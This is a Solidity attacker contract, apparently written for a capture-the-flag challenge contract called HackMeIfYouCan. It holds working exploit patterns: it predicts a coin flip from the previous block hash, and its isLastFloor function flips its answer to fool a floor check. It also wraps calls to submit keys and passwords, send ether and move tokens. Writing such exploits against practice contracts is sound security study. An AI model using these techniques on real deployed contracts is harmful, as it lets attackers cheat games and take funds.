pragma solidity ^0.7.0;

import "../src/HackMeIfYouCan.sol";

contract Hacker {

    bool public switchFlipped =  false;
    
    function isLastFloor(uint) external returns (bool) {
        // first call
      if (! switchFlipped) {
        switchFlipped = true;
        return false;
        // second call
      } else {
        switchFlipped = false;
        return true;
      }
    }

    HackMeIfYouCan public toHack;
    uint256 FACTOR =
        6275657625726723324896521676682367236752985978263786257989175917;
    uint256 lastHash;

    constructor(address _toHack) public {
        toHack = HackMeIfYouCan(payable(_toHack));
    }

    function flip() public payable returns(bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        bool win = toHack.flip(side);
        return win;
    }

    function addPoint() public {
        toHack.addPoint();
    }

    function transfer() public returns(uint256){
        toHack.transfer(address(toHack),1);
        return toHack.balanceOf(address(this));
    }

    function sendKey(bytes16 _key) public {
        toHack.sendKey(_key);
    }

    function sendPassword(bytes32 _pass) public {
        toHack.sendPassword(_pass);
    }

    function contribute() public payable{
        toHack.contribute{value: 0.00001 ether}();
        address(toHack).call{value: 0.00001 ether}("");
    }

    function goTo(uint256 _floor) public {
        toHack.goTo(_floor);
    }

    // fallback() external payable {
    //     toHack.transfer(address(this), 100);
    // }

    // function attack() external payable {
    //     toHack.transfer(address(this), 100);
    // }

    receive() external payable {}
}
